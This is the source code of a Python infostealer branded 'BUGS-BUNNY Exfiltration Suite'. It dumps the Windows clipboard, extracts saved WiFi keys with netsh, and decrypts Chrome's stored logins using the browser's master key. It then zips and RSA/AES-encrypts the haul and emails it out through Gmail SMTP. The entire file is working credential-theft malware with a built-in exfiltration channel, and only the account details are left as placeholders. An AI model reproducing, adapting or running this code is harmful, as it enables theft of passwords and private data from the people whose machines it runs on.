#Importing Required Libraries

import os # For System Operations
import pyperclip # For Clipboard Operations
import shutil # For File Operations
import sqlite3 # For SQLite Database Operations
import subprocess # For Command Line Operations
import json # For JSON Operations
import zipfile # For Zipping Files
import base64 # For Base64 Encoding/Decoding
import win32crypt # For Windows Cryptography
from datetime import datetime # For Date and Time Operations
from Cryptodome.Cipher import AES, PKCS1_OAEP # For AES and RSA Encryption/Decryption
from Cryptodome.Random import get_random_bytes # For Generating Random Bytes
from Cryptodome.PublicKey import RSA # For RSA Key Operations
import smtplib # For Sending Emails
from email.mime.multipart import MIMEMultipart # For Email Multipart
from email.mime.base import MIMEBase # For Email Base
from email import encoders # For Email Encoding
import time # For Time Operations

time.sleep(7)
#----------------------------------------------------------------------------------------------------------------------

#----------------------------------------------------------------------------------------------------------------------
def print_logo_1():
    purple = "\033[95m"
    cyan = "\033[96m"
    bold = "\033[1m"
    reset = "\033[0m"

    logo = rf"""
    {bold}{purple}╔══════════════════════════════════════╗
    {cyan}║     🐰  B U G S - B U N N Y  🐰      ║
    {purple}║      Exfiltration Suite v1.0       ║
    {cyan}╚══════════════════════════════════════╝{reset}
    """
    print(logo)

print_logo_1()
time.sleep(8)
#----------------------------------------------------------------------------------------------------------------------
SAVE_DIR = "dump"
os.makedirs(SAVE_DIR, exist_ok=True)

print("[+] Starting data dump...")
time.sleep(1)

print("[+] Please wait...")
# 1. 📋 Clipboard
def dump_clipboard():
    try:
        clip = pyperclip.paste()
        with open(os.path.join(SAVE_DIR, "clipboard.txt"), "w", encoding="utf-8") as f:
            f.write(clip)
    except Exception as e:
        print(f"[!] Clipboard error: {e}")

time.sleep(2)
print("1-Clipboard data dumped.")


# 2. 📶 WiFi Passwords
def dump_wifi_passwords():
    try:
        result = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]

        with open(os.path.join(SAVE_DIR, "wifi_passwords.txt"), "w", encoding="utf-8") as f:
            for profile in profiles:
                try:
                    wifi_info = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear", shell=True).decode()
                    password_line = [line for line in wifi_info.splitlines() if "Key Content" in line]
                    password = password_line[0].split(":")[1].strip() if password_line else "NO PASSWORD"
                    f.write(f"{profile}: {password}\n")
                except:
                    f.write(f"{profile}: ERROR\n")
    except Exception as e:
        print(f"[!] WiFi dump error: {e}")
time.sleep(2)
print("2-WiFi passwords dumped.")

# 3. 🔐 Chrome Passwords
def get_chrome_master_key():
    path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[!] Master key error: {e}")
        return None

def decrypt_password(buff, key):
    try:
        if buff[:3] == b'v10':
            iv = buff[3:15]
            payload = buff[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode()
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except:
        return "DECRYPTION FAILED"

def dump_chrome_passwords():
    base = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 5)]
    key = get_chrome_master_key()
    if not key: return

    for profile in profiles:
        db_path = os.path.join(base, profile, "Login Data")
        if not os.path.exists(db_path):
            continue
        try:
            tmp_copy = os.path.join(SAVE_DIR, f"LoginData_{profile}.db")
            shutil.copy2(db_path, tmp_copy)

            conn = sqlite3.connect(tmp_copy)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            with open(os.path.join(SAVE_DIR, f"chrome_{profile}.txt"), "w", encoding="utf-8") as f:
                for row in cursor.fetchall():
                    url, user, enc_pwd = row
                    decrypted = decrypt_password(enc_pwd, key)
                    f.write(f"{url} | {user} | {decrypted}\n")

            conn.close()
            os.remove(tmp_copy)
        except Exception as e:
            print(f"[!] Chrome {profile} error: {e}")
time.sleep(5)
print("3-Chrome passwords dumped.")

# 4. 🗜️ Zip Data
def zip_results():
    zip_name = f"dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    zip_path = os.path.join(SAVE_DIR, zip_name)  # Save zip in the same directory

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(SAVE_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path != zip_path:
                    arcname = os.path.relpath(file_path, SAVE_DIR)
                    zipf.write(file_path, arcname=arcname)
    time.sleep(2)
    print("4-Data zipped.")
    return zip_path

# 5. 🔒 Hybrid Encryption
def hybrid_encrypt(file_path, pubkey_path):
    session_key = get_random_bytes(16)
    
    with open(pubkey_path, "rb") as f:
        recipient_key = RSA.import_key(f.read())

    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    with open(file_path, "rb") as f:
        data = f.read()

    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)

    enc_file = file_path + ".enc"
    with open(enc_file, "wb") as f:
        f.write(enc_session_key)
        f.write(cipher_aes.nonce)
        f.write(tag)
        f.write(ciphertext)

    return enc_file
print("5-Data encrypted.")

# 6. 📧 Send Email
def send_file(sender, password, recipient, file_path):
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = "Encrypted Data Dump"

    with open(file_path, "rb") as f:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
        msg.attach(part)

    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(sender, password)
        server.send_message(msg)
        server.quit()
        print("[+] Email sent")
    except Exception as e:
        print(f"[!] Email error: {e}")

# 🧪 Main
if __name__ == "__main__":
    dump_clipboard()
    dump_wifi_passwords()
    dump_chrome_passwords()

    zipped = zip_results()
    encrypted = hybrid_encrypt(zipped, "public.pem")
    send_file("Sender Emil", "Your AppPasswords ", "Recipient email", encrypted)
